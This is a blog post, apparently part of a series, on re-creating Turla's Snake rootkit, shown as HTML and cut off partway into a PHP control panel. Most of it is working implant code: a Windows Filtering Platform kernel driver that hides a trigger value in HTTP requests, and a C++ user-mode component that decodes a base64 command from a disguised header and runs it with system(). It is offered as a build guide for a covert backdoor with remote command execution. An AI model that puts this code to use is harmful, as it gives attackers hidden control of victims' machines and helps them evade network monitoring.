<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Re-creating the Snake Rootkit Part 003: Implementing Covert Communication Using The Windows…</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Re-creating the Snake Rootkit Part 003: Implementing Covert Communication Using The Windows…</h1>
</header>
<section data-field="subtitle" class="p-summary">
Obligatory disclaimer: All of the information presented here is for research purposes and should only be used in a legitimate and legal…
</section>
<section data-field="body" class="e-content">
<section name="8195" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="5375" id="5375" class="graf graf--h3 graf--leading graf--title">Re-creating the Snake Rootkit Part 003: Implementing Covert Communication Using The Windows Filtering Platform (WFP)</h3><figure name="b41d" id="b41d" class="graf graf--figure graf-after--h3"><img class="graf-image" data-image-id="0*CSzZ0A9_g-4oq5BF" data-width="650" data-height="366" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/0*CSzZ0A9_g-4oq5BF"><figcaption class="imageCaption">Source: <a href="https://www.kidsnews.com.au/animals/hungry-snake-swallows-slipper-and-ends-up-in-surgery/news-story/473ee0173e3ead779f13bffa5b48aa55" data-href="https://www.kidsnews.com.au/animals/hungry-snake-swallows-slipper-and-ends-up-in-surgery/news-story/473ee0173e3ead779f13bffa5b48aa55" class="markup--anchor markup--figure-anchor" rel="nofollow noopener" target="_blank">https://www.kidsnews.com.au/animals/hungry-snake-swallows-slipper-and-ends-up-in-surgery/news-story/473ee0173e3ead779f13bffa5b48aa55</a></figcaption></figure><p name="e125" id="e125" class="graf graf--p graf-after--figure"><strong class="markup--strong markup--p-strong">Obligatory disclaimer: All of the information presented here is for research purposes and should only be used in a legitimate and legal manner, the author will not be held responsible for any misdoings or illegal activities.</strong></p><p name="e46b" id="e46b" class="graf graf--p graf-after--p">We will be basing our implementation on the old version of the rootkit which used a simplified version of the “ustart” authentication mechanism [0]: <a href="https://hitcon.org/2014/downloads/E1_05_Paul%20Rascagneres%20-%20Uroburos%20Rootkit.pdf" data-href="https://hitcon.org/2014/downloads/E1_05_Paul%20Rascagneres%20-%20Uroburos%20Rootkit.pdf" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://hitcon.org/2014/downloads/E1_05_Paul%20Rascagneres%20-%20Uroburos%20Rootkit.pdf</a></p><p name="44e1" id="44e1" class="graf graf--p graf-after--p">The implementation will be very similar to our original inspiration for the WFP kernel driver by V3ded[1]: <a href="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2" data-href="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2</a></p><p name="44e8" id="44e8" class="graf graf--p graf-after--p">To sum up our approach, we are going to be sending a GET request with the unique identifier of the implant (known as “ustart”), then this byte sequence has been recognised the command will be forwarded to the user-mode component which will then perform the appropriate action. We will furthermore be storing the payload in an HTTP header for further stealth.</p><h3 name="3935" id="3935" class="graf graf--h3 graf-after--p">Communication</h3><h4 name="7e9d" id="7e9d" class="graf graf--h4 graf-after--h3">The GET request</h4><p name="6678" id="6678" class="graf graf--p graf-after--h4">Since we are going to be modifying the raw bytes of the get request, let&#39;s first see if we can get a normal HTTP request working using only raw bytes.</p><p name="27dc" id="27dc" class="graf graf--p graf-after--p">To verify that we simply are sending the string “GET / HTTP/1.1” to the server for a normal GET request we use nc and pythons simple HTTP server, and we see that we are correct:</p><figure name="f308" id="f308" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*49OfQDYRxAd4A-ZtYdUrPg.png" data-width="613" data-height="548" src="https://cdn-images-1.medium.com/max/800/1*49OfQDYRxAd4A-ZtYdUrPg.png"><figcaption class="imageCaption">Send GET request via nc</figcaption></figure><p name="0c66" id="0c66" class="graf graf--p graf-after--figure">Next, let&#39;s create an example request to use with our implant, first things first is to figure out the “ustart” value for our implant.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="99e7" id="99e7" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-comment">// ustart communicaitons</span><br />BYTE ustart[<span class="hljs-number">4</span>] = { <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span> };</span></pre><p name="4845" id="4845" class="graf graf--p graf-after--pre">Now let&#39;s add this to our request, to do this I just copy and paste a request from my browser to a .txt document and add the “A”s to the start of the request. To send the request I just use a trick from exploit development which is to cat the file and pipe using Netcat to send it.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="d982" id="d982" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-built_in">cat</span> ./get_request.txt | nc 127.0.0.1 8000</span></pre><p name="9980" id="9980" class="graf graf--p graf-after--pre">Let&#39;s then move on to our WFP code and implement a check for the key value.</p><h4 name="3b67" id="3b67" class="graf graf--h4 graf-after--p">WFP implementation</h4><p name="9636" id="9636" class="graf graf--p graf-after--h4">First, we add the “ustart” value to the driver and then we just add a check to the start of the data</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="perl" name="8ee5" id="8ee5" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">if</span> (!(<br />    tcpPayload[<span class="hljs-number">0</span>] == ustart[<span class="hljs-number">0</span>] &amp;&amp;<br />    tcpPayload[<span class="hljs-number">1</span>] == ustart[<span class="hljs-number">1</span>] &amp;&amp;<br />    tcpPayload[<span class="hljs-number">2</span>] == ustart[<span class="hljs-number">2</span>] &amp;&amp;<br />    tcpPayload[<span class="hljs-number">3</span>] == ustart[<span class="hljs-number">3</span>]<br />    )) {<br />    KdPrint((<span class="hljs-string">&quot;  - [!] Discarding the packet due to an invalid password - {0x%x, 0x%x, 0x%x, 0x%x}.\n&quot;</span>, tcpPayload[<span class="hljs-number">0</span>], tcpPayload[<span class="hljs-number">1</span>], tcpPayload[<span class="hljs-number">2</span>], tcpPayload[<span class="hljs-number">3</span>]));<br />    <span class="hljs-keyword">return</span>;<br />}</span></pre><figure name="3e55" id="3e55" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*zyX4AaUfxHUmsl1auKiChw.png" data-width="564" data-height="85" src="https://cdn-images-1.medium.com/max/800/1*zyX4AaUfxHUmsl1auKiChw.png"><figcaption class="imageCaption">Simple ustart</figcaption></figure><p name="ba2c" id="ba2c" class="graf graf--p graf-after--figure">This does however look very suspicious! so let&#39;s change this to verify the start value from the page requested, this is rather simple as the requests will all be formatted the same way.</p><figure name="de9b" id="de9b" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*Iv728zB3QozQ0DT5S8U07A.png" data-width="876" data-height="234" src="https://cdn-images-1.medium.com/max/800/1*Iv728zB3QozQ0DT5S8U07A.png"><figcaption class="imageCaption">Simplified ustart in URL</figcaption></figure><p name="ae7d" id="ae7d" class="graf graf--p graf-after--figure">Much better, then this can be customized based on which target we are going after to make it blend in with normal traffic.</p><figure name="8df8" id="8df8" class="graf graf--figure graf--startsWithDoubleQuote graf-after--p"><img class="graf-image" data-image-id="1*gu0Ew_ziEYSpCxK82B52TQ.png" data-width="825" data-height="136" src="https://cdn-images-1.medium.com/max/800/1*gu0Ew_ziEYSpCxK82B52TQ.png"><figcaption class="imageCaption">“Obfuscated” ustart in URL</figcaption></figure><p name="8efc" id="8efc" class="graf graf--p graf-after--figure">Updated filtering values:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="perl" name="ec81" id="ec81" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-keyword">if</span> (!(<br />    tcpPayload[<span class="hljs-number">5</span>] == ustart[<span class="hljs-number">0</span>] &amp;&amp;<br />    tcpPayload[<span class="hljs-number">6</span>] == ustart[<span class="hljs-number">1</span>] &amp;&amp;<br />    tcpPayload[<span class="hljs-number">7</span>] == ustart[<span class="hljs-number">2</span>] &amp;&amp;<br />    tcpPayload[<span class="hljs-number">8</span>] == ustart[<span class="hljs-number">3</span>]<br />    )) {<br />    KdPrint((<span class="hljs-string">&quot;  - [!] Discarding the packet due to an invalid password - {0x%x, 0x%x, 0x%x, 0x%x}.\n&quot;</span>, tcpPayload[<span class="hljs-number">0</span>], tcpPayload[<span class="hljs-number">1</span>], tcpPayload[<span class="hljs-number">2</span>], tcpPayload[<span class="hljs-number">3</span>]));<br />    <span class="hljs-keyword">return</span>;<br />}</span></pre><p name="543a" id="543a" class="graf graf--p graf-after--pre">If we in the future want to go back and be more faithful to the original we can just change this back to checking the start of the request (this will also mean that we have to update how our C2 requests are made, but that is a problem for another day).</p><h4 name="484d" id="484d" class="graf graf--h4 graf-after--p">Forwarding command to user-mode component</h4><p name="72e9" id="72e9" class="graf graf--p graf-after--h4">Now we have our filtering in place we need to set up some way of forwarding the whole packet to our user-mode component. For this, I create a global variable in the kernel driver to store the verified package, and then whenever the IOCTL is called the variable is sent and the variable is cleared, then the processing can be done in the user mode component.</p><p name="9316" id="9316" class="graf graf--p graf-after--p">Updated handler function:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="rust" name="91c9" id="91c9" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">NTSTATUS <span class="hljs-title function_ invoke__">HandleCustomIOCTL</span>(PDEVICE_OBJECT DeviceObject, PIRP Irp)<br />{<br />    <span class="hljs-title function_ invoke__">UNREFERENCED_PARAMETER</span>(DeviceObject);<br />    PIO_STACK_LOCATION stackLocation = NULL;<br />    stackLocation = <span class="hljs-title function_ invoke__">IoGetCurrentIrpStackLocation</span>(Irp);<br /><br />    <span class="hljs-title function_ invoke__">if</span> (stackLocation<span class="hljs-punctuation">-&gt;</span>Parameters.DeviceIoControl.IoControlCode == IOCTL_COMMUNICATION_PASSTHROUGH)<br />    {<br />        <span class="hljs-title function_ invoke__">KdPrint</span>((<span class="hljs-string">&quot;IOCTL_SPOTLESS (0x%x) issued\n&quot;</span>, stackLocation<span class="hljs-punctuation">-&gt;</span>Parameters.DeviceIoControl.IoControlCode));<br />        <span class="hljs-title function_ invoke__">KdPrint</span>((<span class="hljs-string">&quot;Input received from userland: %s\n&quot;</span>, (<span class="hljs-type">char</span>*)Irp<span class="hljs-punctuation">-&gt;</span>AssociatedIrp.SystemBuffer));<br />        Irp<span class="hljs-punctuation">-&gt;</span>IoStatus.Information = <span class="hljs-title function_ invoke__">strlen</span>(verifiedPackage);<br />        Irp<span class="hljs-punctuation">-&gt;</span>IoStatus.Status = STATUS_SUCCESS;<br /><br />        <span class="hljs-title function_ invoke__">KdPrint</span>((<span class="hljs-string">&quot;Sending to userland: %s\n&quot;</span>, verifiedPackage));<br />        <span class="hljs-title function_ invoke__">RtlCopyMemory</span>(Irp<span class="hljs-punctuation">-&gt;</span>AssociatedIrp.SystemBuffer, verifiedPackage, <span class="hljs-title function_ invoke__">strlen</span>(verifiedPackage));<br />        <span class="hljs-comment">// clear string</span><br />        verifiedPackage = <span class="hljs-string">&quot;&quot;</span>;<br />    }<br />    <span class="hljs-title function_ invoke__">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);<br />    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br />}</span></pre><p name="8f51" id="8f51" class="graf graf--p graf-after--pre">Using a modified version of our original userland program we can check that this is working as expected:</p><figure name="3596" id="3596" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*1Fd3wmB494viQNtBKVtNpg.png" data-width="1256" data-height="519" src="https://cdn-images-1.medium.com/max/800/1*1Fd3wmB494viQNtBKVtNpg.png"><figcaption class="imageCaption">Successful communication of ustart request between kernel and userland</figcaption></figure><p name="4686" id="4686" class="graf graf--p graf-after--figure">Next on my to-do list is to rewrite the userland program in nim to ease further production.</p><h3 name="6687" id="6687" class="graf graf--h3 graf-after--p">Add parsing and command execution to the userland application</h3><p name="18fc" id="18fc" class="graf graf--p graf-after--h3">For this I&#39;m storing the command to be executed in base64 encoded format in one of the HTTP headers, the user-mode application is then made to routinely check for “ustart” communication and when this happens the header is decoded and the command is executed, the final result looks like so:</p><figure name="3b25" id="3b25" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*rSuN1KSMYP65UaZDJrpfQA.gif" data-width="1253" data-height="837" src="https://cdn-images-1.medium.com/max/800/1*rSuN1KSMYP65UaZDJrpfQA.gif"><figcaption class="imageCaption">Basic command execution</figcaption></figure><p name="e4f3" id="e4f3" class="graf graf--p graf-after--figure">The command could be anything but for the sake of the demonstration, calc is launched using CMD. The code for the userland component now looks like so:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="da01" id="da01" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;regex&gt;</span></span><br /><br /><span class="hljs-meta">#<span class="hljs-keyword">define</span> IOCTL_SPOTLESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2049, METHOD_BUFFERED, FILE_ANY_ACCESS)</span><br /><br /><span class="hljs-comment">// Code taken from https://www.programmingalgorithms.com/algorithm/base64-decoding/cpp/</span><br /><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">char</span> <span class="hljs-title">CharToSixBit</span><span class="hljs-params">(<span class="hljs-type">char</span> c)</span> </span>{<br /> <span class="hljs-type">char</span> lookupTable[] = {<br />  <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>,<br />  <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>,<br />  <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>,<br />  <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>,<br />  <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span><br /> };<br /><br /> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;=&#x27;</span>)<br /> {<br />  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br /> }<br /> <span class="hljs-keyword">else</span><br /> {<br />  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; <span class="hljs-number">64</span>; x++)<br />  {<br />   <span class="hljs-keyword">if</span> (lookupTable[x] == c)<br />    <span class="hljs-built_in">return</span> (<span class="hljs-type">char</span>)x;<br />  }<br /><br />  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br /> }<br />}<br /><br /><span class="hljs-function"><span class="hljs-type">static</span> std::string <span class="hljs-title">Decode</span><span class="hljs-params">(std::string data)</span> </span>{<br /> <span class="hljs-type">int</span> length, length2, length3;<br /> <span class="hljs-type">int</span> blockCount;<br /> <span class="hljs-type">int</span> paddingCount = <span class="hljs-number">0</span>;<br /> <span class="hljs-type">int</span> dataLength = data.<span class="hljs-built_in">length</span>();<br /><br /> length = dataLength;<br /> blockCount = length / <span class="hljs-number">4</span>;<br /> length2 = blockCount * <span class="hljs-number">3</span>;<br /><br /> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; <span class="hljs-number">2</span>; x++)<br /> {<br />  <span class="hljs-keyword">if</span> (data[length - x - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br />   paddingCount++;<br /> }<br /><br /> <span class="hljs-type">char</span>* buffer = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[length];<br /> <span class="hljs-type">char</span>* buffer2 = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[length2];<br /><br /> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; length; x++)<br /> {<br />  buffer[x] = <span class="hljs-built_in">CharToSixBit</span>(data[x]);<br /> }<br /><br /> <span class="hljs-type">char</span> b, b1, b2, b3;<br /> <span class="hljs-type">char</span> temp1, temp2, temp3, temp4;<br /><br /> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; blockCount; x++)<br /> {<br />  temp1 = buffer[x * <span class="hljs-number">4</span>];<br />  temp2 = buffer[x * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>];<br />  temp3 = buffer[x * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>];<br />  temp4 = buffer[x * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>];<br /><br />  b = (<span class="hljs-type">char</span>)(temp1 &lt;&lt; <span class="hljs-number">2</span>);<br />  b1 = (<span class="hljs-type">char</span>)((temp2 &amp; <span class="hljs-number">48</span>) &gt;&gt; <span class="hljs-number">4</span>);<br />  b1 += b;<br /><br />  b = (<span class="hljs-type">char</span>)((temp2 &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">4</span>);<br />  b2 = (<span class="hljs-type">char</span>)((temp3 &amp; <span class="hljs-number">60</span>) &gt;&gt; <span class="hljs-number">2</span>);<br />  b2 += b;<br /><br />  b = (<span class="hljs-type">char</span>)((temp3 &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>);<br />  b3 = temp4;<br />  b3 += b;<br /><br />  buffer2[x * <span class="hljs-number">3</span>] = b1;<br />  buffer2[x * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>] = b2;<br />  buffer2[x * <span class="hljs-number">3</span> + <span class="hljs-number">2</span>] = b3;<br /> }<br /><br /> length3 = length2 - paddingCount;<br /> std::string result;<br /><br /> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = <span class="hljs-number">0</span>; x &lt; length3; x++)<br /> {<br />  result += buffer2[x];<br /> }<br /><br /> <span class="hljs-keyword">delete</span>[] buffer;<br /> <span class="hljs-keyword">delete</span>[] buffer2;<br /><br /> <span class="hljs-keyword">return</span> result;<br />}<br /><br /><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">char</span> argc, <span class="hljs-type">char</span> ** argv)</span><br /></span>{<br /> HANDLE device = INVALID_HANDLE_VALUE;<br /> BOOL status = FALSE;<br /> DWORD bytesReturned = <span class="hljs-number">0</span>;<br /> CHAR inBuffer[<span class="hljs-number">4096</span>] = { <span class="hljs-number">0</span> };<br /> CHAR outBuffer[<span class="hljs-number">4096</span>] = { <span class="hljs-number">0</span> };<br /><br /> <span class="hljs-built_in">RtlCopyMemory</span>(inBuffer, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>);<br /><br /> device = <span class="hljs-built_in">CreateFileW</span>(<span class="hljs-string">L&quot;\\\\.\\Sn33kDeviceLink&quot;</span>, GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, <span class="hljs-number">0</span>);<br /><br /> <span class="hljs-keyword">if</span> (device == INVALID_HANDLE_VALUE)<br /> {<br />  <span class="hljs-built_in">printf_s</span>(<span class="hljs-string">&quot;&gt; Could not open device: 0x%x\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br />  <span class="hljs-keyword">return</span> FALSE;<br /> }<br /><br /> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Starting while loop listening for command&quot;</span>);<br /> <span class="hljs-keyword">for</span> (;;) {<br />  <span class="hljs-built_in">printf_s</span>(<span class="hljs-string">&quot;&gt; Issuing IOCTL_SPOTLESS 0x%x\n&quot;</span>, IOCTL_SPOTLESS);<br />  status = <span class="hljs-built_in">DeviceIoControl</span>(device, IOCTL_SPOTLESS, inBuffer, <span class="hljs-built_in">sizeof</span>(inBuffer), outBuffer, <span class="hljs-built_in">sizeof</span>(outBuffer), &amp;bytesReturned, (LPOVERLAPPED)<span class="hljs-literal">NULL</span>);<br />  <span class="hljs-built_in">printf_s</span>(<span class="hljs-string">&quot;&gt; IOCTL_SPOTLESS 0x%x issued\n&quot;</span>, IOCTL_SPOTLESS);<br /><br />  <span class="hljs-built_in">printf_s</span>(<span class="hljs-string">&quot;&gt; Received from the kernel land: %s. Received buffer size: %d\n&quot;</span>, outBuffer, bytesReturned);<br /><br />  <span class="hljs-keyword">if</span> (bytesReturned != <span class="hljs-number">0</span>) {<br />   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Extracting cookie value\n&quot;</span>);<br /><br />   std::string tempCookieValue = <span class="hljs-string">&quot;&quot;</span>;<br />   <span class="hljs-function">std::string <span class="hljs-title">outBufferString</span><span class="hljs-params">(outBuffer)</span></span>;<br />   <span class="hljs-function">std::string <span class="hljs-title">pattern</span><span class="hljs-params">(<span class="hljs-string">&quot;Cache-Auth:&quot;</span>)</span></span>;<span class="hljs-comment">// Regex expression</span><br />   <span class="hljs-function">std::regex <span class="hljs-title">rx</span><span class="hljs-params">(pattern)</span></span>;<br />   std::smatch match;<br />   <span class="hljs-keyword">if</span> (std::<span class="hljs-built_in">regex_search</span>(outBufferString, match, rx))<br />    std::cout &lt;&lt; <span class="hljs-string">&quot;match: &quot;</span> &lt;&lt; match[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br /><br />   <span class="hljs-type">int</span> cookieOffset = match.<span class="hljs-built_in">position</span>(<span class="hljs-number">0</span>) + pattern.<span class="hljs-built_in">length</span>() + <span class="hljs-number">1</span>;<br /><br />   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;; i++) {<br />    <span class="hljs-keyword">if</span> (outBufferString[i + cookieOffset] == <span class="hljs-string">&#x27;\n&#x27;</span>) {<br />     <span class="hljs-keyword">break</span>;<br />    }<br />    <span class="hljs-type">const</span> <span class="hljs-type">char</span> chr = outBufferString[i + cookieOffset];<br />    tempCookieValue += chr;<br />   }<br />   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cookieValue = tempCookieValue.<span class="hljs-built_in">c_str</span>();<br />   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nCookie value: %s\n&quot;</span>, cookieValue);<br />   std::string command = <span class="hljs-built_in">Decode</span>(tempCookieValue).<span class="hljs-built_in">c_str</span>();<br />   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cookie value decoded: %s\n&quot;</span>, command);<br />   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Executing command&quot;</span>);<br />   std::<span class="hljs-built_in">system</span>(command.<span class="hljs-built_in">c_str</span>());<br />   <span class="hljs-keyword">break</span>;<br />  }<br />  <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">5000</span>);<br /> }<br /> <span class="hljs-built_in">CloseHandle</span>(device);<br />}</span></pre><h4 name="bce2" id="bce2" class="graf graf--h4 graf-after--pre">Basic C2 server</h4><p name="ba4b" id="ba4b" class="graf graf--p graf-after--h4">So now that we have a very simple version of commands working, let&#39;s move on to creating an interface to send these commands. This part should be rather simple as we are just sending GET requests to the listening server, these GET requests are just sent with the appropriate “ustart” value.</p><p name="2f70" id="2f70" class="graf graf--p graf-after--p">To accomplish this let&#39;s draw some more inspiration from the original, this is the inspiration and the look that we are going for[2]:</p><figure name="6fe6" id="6fe6" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="0*X_NWD4vW9RxL6Gj0.jpg" data-width="860" data-height="578" src="https://cdn-images-1.medium.com/max/800/0*X_NWD4vW9RxL6Gj0.jpg"><figcaption class="imageCaption">The look we are going for</figcaption></figure><div name="10d4" id="10d4" class="graf graf--mixtapeEmbed graf-after--figure"><a href="https://securelist.com/the-epic-turla-operation/65545/" data-href="https://securelist.com/the-epic-turla-operation/65545/" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://securelist.com/the-epic-turla-operation/65545/"><strong class="markup--strong markup--mixtapeEmbed-strong">The Epic Turla Operation</strong><br><em class="markup--em markup--mixtapeEmbed-em">Over the last 10 months, we have analyzed a massive cyber-espionage operation which we call &quot;Epic Turla&quot;. The attackers…</em>securelist.com</a><a href="https://securelist.com/the-epic-turla-operation/65545/" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="b0b61319f3ed70e4558c27bc92bcf211" data-thumbnail-img-id="0*zLezFfiTtxk8zLKl" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*zLezFfiTtxk8zLKl);"></a></div><p name="ff1e" id="ff1e" class="graf graf--p graf-after--mixtapeEmbed">After a bit of messing around and remembering how HTML and CSS works, we get this:</p><figure name="d3c5" id="d3c5" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*FrdeqMGSi57WS_1lrjfdwg.png" data-width="877" data-height="820" src="https://cdn-images-1.medium.com/max/800/1*FrdeqMGSi57WS_1lrjfdwg.png"><figcaption class="imageCaption">Mockup of C2 interface</figcaption></figure><p name="3ed4" id="3ed4" class="graf graf--p graf-after--figure">It&#39;s not perfect but it is good enough for government work. The final product ended up looking a bit different than this, but the idea is roughly the same.</p><p name="ca0d" id="ca0d" class="graf graf--p graf-after--p">Since Turla and the snake malware are rumoured to have been around for more than 20 years, I think it&#39;s only fitting that we write the c2 interface in old-school PHP, meaning no fancy frameworks, only suffering!</p><p name="5522" id="5522" class="graf graf--p graf-after--p">After some hours of coding later we have a PoC! The code for this is listed below:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php-template" name="f5b9" id="f5b9" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="language-xml">// index.php<br 